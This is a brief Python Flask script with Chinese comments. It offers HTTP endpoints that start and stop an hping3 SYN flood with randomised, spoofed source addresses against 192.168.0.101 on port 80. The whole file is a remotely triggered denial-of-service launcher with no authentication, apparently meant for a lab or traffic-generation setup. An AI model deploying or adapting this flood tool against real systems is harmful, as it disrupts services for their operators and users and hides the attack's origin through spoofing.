#!/usr/bin/python3
from flask import Flask, request, jsonify
from subprocess import Popen, PIPE
import os
import signal

app = Flask(__name__)

# 全局变量存储子进程 PID
hping_process = None

# GET 请求启动 hping3
@app.route('/start_hping', methods=['GET'])
def start_hping():
    global hping_process

    # 如果进程已经在运行，返回提示
    if hping_process and hping_process.poll() is None:
        return jsonify({"status": "hping3 is already running!"}), 400

    # 启动 hping3 命令
    cmd = ["hping3", "-c", "1000", "-d", "120", "-S", "-w", "64", "-p", "80", "--flood", "--rand-source", "192.168.0.101"]
    hping_process = Popen(cmd, stdout=PIPE, stderr=PIPE, preexec_fn=os.setsid)
    return jsonify({"status": "hping3 started successfully!"}), 200

# DELETE 请求停止 hping3
@app.route('/stop_hping', methods=['DELETE'])
def stop_hping():
    global hping_process

    # 检查进程是否在运行
    if not hping_process or hping_process.poll() is not None:
        return jsonify({"status": "hping3 is not running!"}), 400

    # 停止进程及其子进程组
    os.killpg(os.getpgid(hping_process.pid), signal.SIGTERM)
    hping_process = None
    return jsonify({"status": "hping3 stopped successfully!"}), 200

if __name__ == '__main__':
    # 启动 Flask 应用
    app.run(host='0.0.0.0', port=5000, debug=False)
